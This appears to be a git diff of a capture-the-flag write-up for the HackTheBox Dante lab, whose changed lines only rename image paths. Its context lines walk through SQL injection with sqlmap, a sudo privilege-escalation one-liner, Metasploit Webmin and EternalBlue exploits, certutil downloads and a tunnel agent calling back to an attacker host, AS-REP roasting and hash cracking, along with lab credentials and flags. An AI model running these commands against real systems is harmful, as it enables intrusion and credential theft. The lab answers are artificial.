@@ -1114,7 +1114,7 @@ Looks like HTTP and SMB port is open. Let's start with SMB enumeration
 smbclient -L \\\\172.16.1.10\\
 ```
 
-<figure><img src="../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (125) (1).png" alt=""><figcaption></figcaption></figure>
 
 Looks like we have some interesting stuff here. Enumerate the `print$` and `SlackMigration` shares.
 
@@ -1122,9 +1122,9 @@ Looks like we have some interesting stuff here. Enumerate the `print$` and `Slac
 smbclient //172.16.1.10/SlackMigration -c 'recurse;ls'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (126) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (127) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a file present. Connect to the share and download it
 
@@ -1135,11 +1135,11 @@ smb: \> get admintasks.txt
 
 Check the txt file out
 
-<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (129) (1).png" alt=""><figcaption></figcaption></figure>
 
 There a few hints here. But what is interesting its mentioning the user `margaret` . This could be useful later. Let's check out the HTTP port.
 
-<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (130) (1).png" alt=""><figcaption></figcaption></figure>
 
 When checking out the website. I noticed something familiar with the URL. It has potential to be vulnerable to LFI&#x20;
 
@@ -1212,11 +1212,11 @@ Enter and boom we have an interactive shell
 
 Like usual, for privesc upload linpeas and let's see what we can find
 
-<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
 
 There are no other interesting stuff in `margaret`'s but there some worth checking out in `frank`'s. Looks like it has something to do with Slack.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (117) (1).png" alt=""><figcaption></figcaption></figure>
 
 Even though we could not traverse the directories, we could download the zipped file of the export onto our machine and change directories directly.
 
@@ -1224,23 +1224,23 @@ Looking at around, there is a leaked conversation between `frank` and `margaret`
 
 `/secure/2020-05-18.json`
 
-<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (118) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see the password of `frank` being leaked here. Let's try switching to frank.
 
-<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>
 
 It didn't work and I was frustrated. I kept looking for a way and then I found this article
 
-<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since, we dont' have access on frank, we can access it on margaret's home directory.
 
-<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (122) (1).png" alt=""><figcaption></figcaption></figure>
 
 I looked through everything and found nothing and decided to look at the `/exported_data` folder and hoped to find something different and well...
 
-<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (123) (1).png" alt=""><figcaption></figcaption></figure>
 
 I don't know why this happened honestly, was it intentional? maybe...but it is very annoying :)
 
@@ -1343,19 +1343,19 @@ I tried to look for known exploits of PHP 7.4.7 but known were available. So, i 
 feroxbuster -u http://172.16.1.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>
 
 Two notable directories were `/blog` and `/blog/database`. Lets check them out
 
-<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (108) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are met with a responsive blog template according to the title here
 
-<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (111) (1).png" alt=""><figcaption></figcaption></figure>
 
 I was looking around and found this
 
-<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (114) (1).png" alt=""><figcaption></figcaption></figure>
 
 Notice the URL:
 
@@ -1365,11 +1365,11 @@ http://172.16.1.12/blog/single.php?id=5
 
 I thought this was an easy IDOR but I was wrong xD. Also tested it multiple times but nothing came out. Also, Wappalyzer does not show this is built on a CMS. Let's continue to check the subdirectory
 
-<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (112) (1).png" alt=""><figcaption></figcaption></figure>
 
 Okay, standard XAMPP database directory. Now, let's try to look for some exploits. I found one that proved useful from Exploitdb
 
-<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (113) (1).png" alt=""><figcaption></figcaption></figure>
 
 So basically the vulnerable file is `/category.php` which has the vulnerable code:
 
@@ -1384,7 +1384,7 @@ The `id` parameter is inserted directly into the SQL query without any sanitizat
 http://172.16.1.12/blog/category.php?id=5'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (115) (1).png" alt=""><figcaption></figcaption></figure>
 
 And there it is, returning an SQL error. From here, we can use `sqlmap` to enumerate available databases
 
@@ -1392,7 +1392,7 @@ And there it is, returning an SQL error. From here, we can use `sqlmap` to enume
 sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch
 ```
 
-<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (96) (1).png" alt=""><figcaption></figcaption></figure>
 
 Alright, that worked. We have a database named `flag.` Check the tables
 
@@ -1400,7 +1400,7 @@ Alright, that worked. We have a database named `flag.` Check the tables
 sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D flag --tables
 ```
 
-<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (97) (1).png" alt=""><figcaption></figcaption></figure>
 
 Dump the `flag` tables
 
@@ -1408,7 +1408,7 @@ Dump the `flag` tables
 sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D flag -T flag --dump
 ```
 
-<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (99) (1).png" alt=""><figcaption></figcaption></figure>
 
 7th flag: `DANTE{wHy_y0U_n0_s3cURe?!?!}`
 
@@ -1418,7 +1418,7 @@ sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D flag -T flag
 
 Looking again, there was a `blog_admin_db` database. After enumerating tables and dumping it, we will get some interesting information
 
-<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (100) (1).png" alt=""><figcaption></figcaption></figure>
 
 Enumerating the tables will show us a few tables. But the want we are interested in is `membership_users` .
 
@@ -1426,7 +1426,7 @@ Enumerating the tables will show us a few tables. But the want we are interested
 sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D blog_admin_db -T membership_users --dump
 ```
 
-<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (101) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now dump it
 
@@ -1434,11 +1434,11 @@ Now dump it
 sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D blog_admin_db -T membership_users --dump
 ```
 
-<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (102) (1).png" alt=""><figcaption></figcaption></figure>
 
 Okay we see 2 users here with their MD5 hashed password. We can crack this using Crackstation. Crack both of their passwords and try to SSH
 
-<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (103) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ben:Welcometomyblog`
 
@@ -1450,7 +1450,7 @@ Above is the password of `Ben`. Eventually we will find out that only Ben has SS
 ssh ben@172.16.1.12
 ```
 
-<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (104) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get the flag
 
@@ -1466,7 +1466,7 @@ Upload linpeas onto the target and run it. Analyzing the output we see a PE vect
 sudo -l
 ```
 
-<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (105) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 (ALL, !root) /bin/bash
@@ -1474,7 +1474,7 @@ sudo -l
 
 Googling a bit will lead to the exploit
 
-<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (106) (1).png" alt=""><figcaption></figcaption></figure>
 
 Exploit:
 
@@ -1482,7 +1482,7 @@ Exploit:
 sudo -u#-1 /bin/bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (107) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Description :
@@ -1499,11 +1499,11 @@ Get the flag
 
 After that, we check `/etc/shadow`.  We can see user `julian` has a hint on his shadow file
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Attempt to crack it using `unshadow`
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 `julian:manchesterunited`
 
@@ -1858,7 +1858,7 @@ We can see a few unusual ports besides HTTP and SMB, also there is a Webmin serv
 smbclient -L \\\\172.16.1.17\\
 ```
 
-<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (74) (1).png" alt=""><figcaption></figcaption></figure>
 
 We got something here, a share named `forensics`. Enumerate more
 
@@ -1866,7 +1866,7 @@ We got something here, a share named `forensics`. Enumerate more
 smbclient //172.16.1.17/forensics -c 'recurse;ls'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (75) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a file inside. Download it onto our machine
 
@@ -1880,11 +1880,11 @@ Analyze the file type
 file monitor
 ```
 
-<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure>
 
 Its a PCAP file. We can do further analysis using Wireshark
 
-<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77) (1).png" alt=""><figcaption></figcaption></figure>
 
 Right off the bat, a HTTP packet jumped right out from the webmin port which is `10000` with the admin credentials.&#x20;
 
@@ -1892,43 +1892,43 @@ Right off the bat, a HTTP packet jumped right out from the webmin port which is 
 
 Okay, lets head to the webmin page
 
-<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (78) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are prompted with a login page. Enter the credentials earlier, but we will get an error
 
-<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (79) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i decided to look again at the PCAP file. Instead of looking at the packets at surface area. I followed the HTTP stream of the packets
 
-<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (80) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is the packet we inspected earlier let's scroll down.
 
-<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (81) (1).png" alt=""><figcaption></figcaption></figure>
 
 No wonder an error occured...it was literally the wrong password. Continue to check other packets in the stream
 
-<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (82) (1).png" alt=""><figcaption></figcaption></figure>
 
 In the 5th packet of the stream, its the same credentials but with a capital P in `Password6543`, checking the following packets show that the dashboard loaded and returned a success message
 
-<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (84) (1).png" alt=""><figcaption></figcaption></figure>
 
 `admin:Password6543`
 
 Okay, let's try it out now.
 
-<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
 
 Cool we got in. Now if we look at the lower part of the dashboard, we can see what version the webmin service is using. We are on Webmin 1.900. It also hints that it was exploitable.
 
-<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (86) (1).png" alt=""><figcaption></figcaption></figure>
 
 This Github Advisory Database provides several links for the resources and articles. Rapid7's website provides the module in Metasploit to ease our exploitation
 
-<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (87) (1).png" alt=""><figcaption></figcaption></figure>
 
 It provides the guide on which module to use. We also need to check for the options
 
@@ -1938,7 +1938,7 @@ msf6 > use exploit/unix/webapp/webmin_upload_exec
 msf6 exploit(unix/webapp/webmin_upload_exec) > show options
 ```
 
-<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (88) (1).png" alt=""><figcaption></figcaption></figure>
 
 It requires some essential parameters to be filled like the username, password, target host and target URL where webmin is hosted. After all required parameters are filled, start the exploit
 
@@ -1951,15 +1951,15 @@ msf6 exploit(unix/webapp/webmin_upload_exec) > exploit
 
 Unfortunately, this exploit didnt work even though I have disabled SSL option.
 
-<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (89) (1).png" alt=""><figcaption></figcaption></figure>
 
 I'm beginning to hate Metasploit...anyways I looked for alternative webmin exploit modules on Metasploit.
 
-<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure>
 
 This one looked promising, the parameters were the same as the first module
 
-<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 msf6 > use 7
@@ -1971,11 +1971,11 @@ msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4444
 msf6 exploit(linux/http/webmin_packageup_rce) > exploit
 ```
 
-<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (92) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice, so we have a root session. I went back to the webmin site to look at the available users
 
-<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have user `lou` . Tried to read the flag from her home directory but the flag wasn't there. Then, i just read the root flag.
 
@@ -2011,11 +2011,11 @@ We can see 2 HTTP ports are opened here. Port `80` is just the server (basically
 
 Looking at the webpage, reveals a login page
 
-<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's try to look for some exploits
 
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>
 
 Looking at the Advisory Database here, none of the articles showed a vulnerability that discloses a direct way to access the site through a login page. Therefore, the credentials must be stored somewhere in the different subnets. Let's leave this one on hold
 
@@ -2025,13 +2025,13 @@ Continuation of the progress was over here in later sections
 
 {% embed url="https://mfkrypt.gitbook.io/stuff/ctf-writeups/hackthebox/prolabs/dante#my-cup-runneth-over" %}
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 `Admin_129834765:SamsungOctober102030`
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 17th flag: `DANTE{to_g0_4ward_y0u_mus7_g0_back}`
 
@@ -2240,23 +2240,23 @@ OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
 
 Its vulnerable to the EternalBlue exploit
 
-<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>
 
 There are exploits built in Metasploit. Let's look at some
 
-<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 I used this one initially
 
-<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
 
 After entering the required parameters, it failed
 
-<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>
 
 So, I used another exploit, specifically the `psexec` variant
 
-<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 msf6 > use exploit/windows/smb/ms17_010_psexec
@@ -2266,13 +2266,13 @@ msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 172.16.1.20
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 ```
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (54) (1).png" alt=""><figcaption></figcaption></figure>
 
 And, we get a SYSTEM session. Noice, lets look at some of these users
 
-<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (55) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have users `katwamba`
 
@@ -2322,7 +2322,7 @@ Mode              Size     Type  Last modified              Name
 
 Get the flag in his `Desktop`
 
-<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>
 
 13th flag: `DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}`
 
@@ -2342,19 +2342,19 @@ Also an Excel sheet was in his Desktop
 meterpreter > download employee_backup.xlsx
 ```
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (56) (1).png" alt=""><figcaption></figcaption></figure>
 
 Do some more digging we will find these and downloaded them as well:
 
-<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (57) (1).png" alt=""><figcaption></figcaption></figure>
 
 I used an online xlsx viewer to see the file
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (58) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have a list of users and their credentials. Trying to SSH one by one would be pointless as I was denied entry
 
-<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (60) (1).png" alt=""><figcaption></figcaption></figure>
 
 I uploaded Winpeas to enumerate some more information. I uploaded it using `certutil` because Powershell was not working well. But first, drop into a shell
 
@@ -2365,7 +2365,7 @@ certutil -urlcache -split -f http://10.10.14.4:8000/winPEASx64.exe winPEASx64.ex
 
 Execute Winpeas
 
-<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (66) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, see the flag when enumerating `mrb3n`'s info
 
@@ -2381,11 +2381,11 @@ From here, see the flag when enumerating `mrb3n`'s info
 
 This might be useful. I'm just storing everything I see hahah
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>
 
 Weirdly enough `mrb3n` also couldn't login as SSH and had the same error lmao
 
-<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (64) (1).png" alt=""><figcaption></figcaption></figure>
 
 Check for internal hosts using `netstat:`
 
@@ -2393,13 +2393,13 @@ Check for internal hosts using `netstat:`
 netstat -an | findstr "172.16."
 ```
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (68) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see here there is an internal host with the `172.16.2.5` IP ,which means we have to scan the whole subnet. Yay, more subnets (im dying).&#x20;
 
 Because we are on a Domain Controller. I uploaded a `ligolo-ng` Windows agent to pivot to the internal host
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (69) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 certutil -urlcache -split -f http://10.10.14.4:8000/windows-agent.exe windows-agent.exe
@@ -2413,9 +2413,9 @@ windows-agent.exe -connect 10.10.14.4:8888 -ignore-cert
 
 And we should receive a callback on the listener
 
-<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (70) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (71) (1).png" alt=""><figcaption></figcaption></figure>
 
 Add a new TUN interface on our machine&#x20;
 
@@ -2432,11 +2432,11 @@ sudo ip route add 172.16.2.0/24 dev ligolo-windows
 
 Autoroute and use the interface we set up and start the tunnel
 
-<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (72) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verify the tunnel worked by pinging the host
 
-<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (73) (1).png" alt=""><figcaption></figcaption></figure>
 
 Cool, now that it worked. Let's scan the whole subnet of the new host
 
@@ -2444,7 +2444,7 @@ Cool, now that it worked. Let's scan the whole subnet of the new host
 nmap -sV -sC 172.16.2.0/24
 ```
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 Unfortunaely, this did not work because somehow...the server blocks ICMP requests, even Rustscan didn't work... so I resolved to a Connect scan with the `-Pn` and with a faster rate of `-T4`
 
@@ -2787,7 +2787,7 @@ Not shown: 1000 filtered tcp ports (no-response)
 
 Looks like we only have one subnet up. To inspect the services a little bit deeper, I ran a normal Service scan on the 172.16.2.5 subnet
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Okay finally, This took freaking 2 hours for me to get it right, I wanna punch a wall. Anyways, We can see here there is no HTTP for the first time only SMB, LDAP and Kerberos. This might be an Active Directory machine. Let's goooo.
 
@@ -2797,7 +2797,7 @@ Firstly enumerate SMB shares.
 smbclient -L \\\\172.16.2.5\\
 ```
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 After that, I tried bruteforcing the users RID, but still have nothing
 
@@ -2805,7 +2805,7 @@ After that, I tried bruteforcing the users RID, but still have nothing
 nxc smb 172.16.2.5 -u guest -p '' --rid-brute
 ```
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, let's try to enumerate users using `kerbrute`
 
@@ -2813,11 +2813,11 @@ Now, let's try to enumerate users using `kerbrute`
 ./kerbrute userenum --dc 172.16.2.5 -d DANTE.ADMIN0 ~/HTB-Prolabs/users.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 This however didn't work, so I tried adjusting the domain string to `DANTE`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 And we have a hit on `jbercov@DANTE`
 
@@ -2827,7 +2827,7 @@ Now, we can test for common vulnerabilities like ASREProasting using Impacket's 
 impacket-GetNPUsers DANTE/jbercov -no-pass -dc-ip 172.16.2.5
 ```
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice! jbercov has pre-auth disabled which means we now have his Kerberos 5 AS-REP hash, we can save it in a file and attempt to crack it using hashcat
 
@@ -2835,7 +2835,7 @@ Nice! jbercov has pre-auth disabled which means we now have his Kerberos 5 AS-RE
 hashcat -a 0 -m 18200 jbercov.hash /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 Noice, now we have his password
 
@@ -2847,7 +2847,7 @@ We can log in to his account using `evil-winrm`
 evil-winrm -i 172.16.2.5 -u jbercov -p "myspace7"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, we can get the flag in his Desktop folder
 
@@ -2871,7 +2871,7 @@ Execute Sharphound with the following parameters
 SharpHound.exe --collectionmethods All
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 It will output a zip file containing multiple JSON files of the domain like GPOs, Users, Computers and OUs
 
@@ -2883,15 +2883,15 @@ The Sharphound data must be used with the modern version of Bloodhound CE, or ot
 
 Now, let's spin up Bloodhound and upload the zip file
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Over here, we can see our compromised user, `jbercov`. Using Bloodhound, we can also see what group is he part of as we could inspect permissions.  This is a lateral movement technique called Permission Delegation.
 
